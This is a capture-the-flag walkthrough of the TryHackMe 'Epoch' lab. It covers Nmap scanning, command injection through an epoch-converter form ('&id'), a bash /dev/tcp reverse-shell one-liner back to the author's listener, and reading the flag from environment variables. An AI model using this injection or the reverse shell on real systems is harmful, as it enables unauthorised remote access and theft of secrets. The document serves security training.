# THM - Epoch

#### Ip: 10.10.212.63
#### Name: Epoch
#### Rating: Easy

----------------------------------------------------------------------

epoch.png

```text
Be honest, you have always wanted an online tool that could help you convert UNIX dates and timestamps! Wait... it doesn't need to be online, you say? Are you telling me there is a command-line Linux program that can already do the same thing? Well, of course, we already knew that! Our website actually just passes your input right along to that command-line program!
```

### Enumeration

I'll kick off enumerating this box with an Nmap scan covering all TCP ports. To speed this along I'll also user the `--min-rate 10000` flag:

```text
┌──(ryan㉿kali)-[~/THM/Epoch]
└─$ sudo nmap -p-  --min-rate 10000 10.10.212.63    
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-14 15:18 CDT
Nmap scan report for 10.10.212.63
Host is up (0.12s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.15 seconds
```

Lets scan these ports using the `-sV` and `-sC` flags to enumerate versions and to use default Nmap scripts:

```text
┌──(ryan㉿kali)-[~/THM/Epoch]
└─$ sudo nmap -sC -sV 10.10.212.63 -p 22,80                                                      
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-14 15:18 CDT
Nmap scan report for 10.10.212.63
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e324b8a2ae2ed2dfe755aa470ea10b33 (RSA)
|   256 26a2d32e0f3a6c3a846912db69dafbe5 (ECDSA)
|_  256 0393301c8c44d5d995094ea45a917190 (ED25519)
80/tcp open  http
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Mon, 14 Aug 2023 20:18:30 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 1184
|     Connection: close
|     <!DOCTYPE html>
|     <head>
|     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
|     integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
|     <style>
|     body,
|     html {
|     height: 100%;
|     </style>
|     </head>
|     <body>
|     <div class="container h-100">
|     <div class="row mt-5">
|     <div class="col-12 mb-4">
|     class="text-center">Epoch to UTC convertor 
|     </h3>
|     </div>
|     <form class="col-6 mx-auto" action="/">
|     <div class=" input-group">
|     <input name="epoch" value="" type="text" class="form-control" placeholder="Epoch"
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 405 Method Not Allowed
|     Date: Mon, 14 Aug 2023 20:18:30 GMT
|     Content-Type: text/plain; charset=utf-8
|     Content-Length: 18
|     Allow: GET, HEAD
|     Connection: close
|_    Method Not Allowed
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.93%I=7%D=8/14%Time=64DA8C17%P=aarch64-unknown-linux-gnu%
SF:r(GetRequest,529,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2014\x20Aug\
SF:x202023\x2020:18:30\x20GMT\r\nContent-Type:\x20text/html;\x20charset=ut
SF:f-8\r\nContent-Length:\x201184\r\nConnection:\x20close\r\n\r\n<!DOCTYPE
SF:\x20html>\n\n<head>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20hre
SF:f=\"https://stackpath\.bootstrapcdn\.com/bootstrap/4\.5\.2/css/bootstra
SF:p\.min\.css\"\n\x20\x20\x20\x20\x20\x20\x20\x20integrity=\"sha384-JcKb8
SF:q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP\+VmmDGMN5t9UJ0Z\"\x20cross
SF:origin=\"anonymous\">\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20body,\n\x20\x20\x20\x20\x20\x20\x20\x20html\x20{\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20height:\x20100%;\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20}\n\x20\x20\x20\x20</style>\n</head>\n\n<body>\n\x20\x20
SF:\x20\x20<div\x20class=\"container\x20h-100\">\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20<div\x20class=\"row\x20mt-5\">\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20<div\x20class=\"col-12\x20mb-4\">\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3\x20class=\"text-center
SF:\">Epoch\x20to\x20UTC\x20convertor\x20\xe2\x8f\xb3</h3>\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20<form\x20class=\"col-6\x20mx-auto\"\x20action=\"/\">
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\
SF:x20class=\"\x20input-group\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<input\x20name=\"epoch\"\x20val
SF:ue=\"\"\x20type=\"text\"\x20class=\"form-control\"\x20placeholder=\"Epo
SF:ch\"\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20")%r(HTTPOptions,BC,"HTTP/1\.1\x20405\x20Method\x20Not\x20Allowe
SF:d\r\nDate:\x20Mon,\x2014\x20Aug\x202023\x2020:18:30\x20GMT\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\nContent-Length:\x2018\r\nAllow:
SF:\x20GET,\x20HEAD\r\nConnection:\x20close\r\n\r\nMethod\x20Not\x20Allowe
SF:d")%r(RTSPRequest,BC,"HTTP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nD
SF:ate:\x20Mon,\x2014\x20Aug\x202023\x2020:18:30\x20GMT\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nContent-Length:\x2018\r\nAllow:\x20GE
SF:T,\x20HEAD\r\nConnection:\x20close\r\n\r\nMethod\x20Not\x20Allowed");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.51 seconds
```

Heading over to the site on port 80 we find a "Epoch to UTC convertor"

site.png

The instructions mention "Our website actually just passes your input right along to that command-line program!" so I'm wondering if we can get command execution here.

Trying the command `id` fails, but if I enter `&id` id can print the user challenge's id:

challenge.png

Nice! This should be easily exploitable. 

Lets head over to https://www.revshells.com/ and grab a reverse shell one-liner:

```text
sh -i >& /dev/tcp/10.6.61.45/443 0>&1
```

We can execute it with:

shell.png

You'll notice the page just hangs, that's a good sign!


Checking our netcat listener, we've got a shell back:

```text
┌──(ryan㉿kali)-[~/THM/Epoch]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.6.61.45] from (UNKNOWN) [10.10.212.63] 59238
sh: 0: can't access tty; job control turned off
$ whoami
challenge
$ hostname
e7c1352e71ec
```

Lets get a better command prompt by issuing:

```text
$ /usr/bin/script -qc /bin/bash /dev/null
```

Looking around the box, I didn't see much in terms of finding the hidden flag. Taking a look at the hint for the flag I find:

```text
The developer likes to store data in environment variables, can you find anything of interest there?
```

Weird, I never would have thought to check that. 

We can take a look at environment variables by running `printenv`

Which  gives us our flag:

flag.png

